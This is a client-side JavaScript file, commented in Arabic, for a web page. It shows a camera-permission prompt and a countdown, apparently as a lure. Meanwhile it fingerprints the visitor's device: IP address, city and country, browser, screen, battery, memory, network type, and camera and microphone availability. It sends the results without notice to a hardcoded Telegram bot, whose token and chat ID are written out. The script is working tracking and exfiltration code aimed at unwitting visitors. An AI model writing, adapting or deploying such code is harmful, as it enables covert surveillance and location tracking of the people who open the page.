document.addEventListener("DOMContentLoaded", async function () {
    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E"; // توكن البوت
    const chatId = "5375214810"; // معرف تيليجرام
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress");
    let timeLeft = 20;
    let countdownStarted = false;

    function startCountdown() {
        if (countdownStarted) return;
        countdownStarted = true;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            progressBar.style.width = (timeLeft / 20) * 100 + "%";

            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            console.log("✅ الكاميرا تعمل!");
            startCountdown(); // بدء العد بعد تشغيل الكاميرا
            stream.getTracks().forEach(track => track.stop());
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا:", error);
        }
    }

    async function getIP() {
        try {
            const response = await fetch("https://api64.ipify.org?format=json");
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "غير متاح";
        }
    }

    async function getLocationByIP(ip) {
        try {
            const response = await fetch(`https://ip-api.com/json/${ip}?fields=country,regionName,city`);
            const data = await response.json();
            return `🌍 ${data.city}, ${data.regionName}, ${data.country}`;
        } catch (error) {
            return "غير معروف";
        }
    }

    async function getDeviceInfo() {
        const ip = await getIP();
        const location = await getLocationByIP(ip);

        return {
            "📌 نظام التشغيل": navigator.platform,
            "🌐 المتصفح": navigator.userAgent,
            "📏 دقة الشاشة": `${screen.width}x${screen.height}`,
            "📡 عنوان IP": ip,
            "📍 الموقع الجغرافي": location,
            "🖥️ حجم الرام (تقريبي)": navigator.deviceMemory || "غير معروف",
            "📶 نوع الشبكة": navigator.connection ? navigator.connection.effectiveType : "غير معروف",
            "🔋 حالة البطارية": await getBatteryStatus(),
            "🎥 هل الكاميرا متاحة؟": await checkCamera(),
            "🎤 هل الميكروفون متاح؟": await checkMicrophone(),
            "📞 هل الجهاز هاتف؟": isMobile(),
            "🖥️ نوع الجهاز": getDeviceType(),
            "📝 لغة المتصفح": navigator.language
        };
    }

    async function getBatteryStatus() {
        if (!navigator.getBattery) return "غير معروف";
        const battery = await navigator.getBattery();
        return `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "⚡ قيد الشحن" : ""}`;
    }

    async function checkMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            stream.getTracks().forEach(track => track.stop());
            return "✅ متاح";
        } catch {
            return "❌ غير متاح";
        }
    }

    async function checkCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(track => track.stop());
            return "✅ متاحة";
        } catch {
            return "❌ غير متاحة";
        }
    }

    function isMobile() {
        return /Mobi|Android/i.test(navigator.userAgent) ? "نعم" : "لا";
    }

    function getDeviceType() {
        if (/tablet|ipad/i.test(navigator.userAgent)) return "جهاز لوحي";
        if (/Mobi|Android/i.test(navigator.userAgent)) return "هاتف";
        return "كمبيوتر";
    }

    async function sendToTelegram() {
        const deviceInfo = await getDeviceInfo();
        let message = "📊 **معلومات الجهاز:**\n\n";
        for (const key in deviceInfo) {
            message += `**${key}:** ${deviceInfo[key]}\n`;
        }

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال المعلومات:", data))
        .catch(error => console.error("❌ خطأ في الإرسال:", error));
    }

    await startCamera();
    sendToTelegram();
});
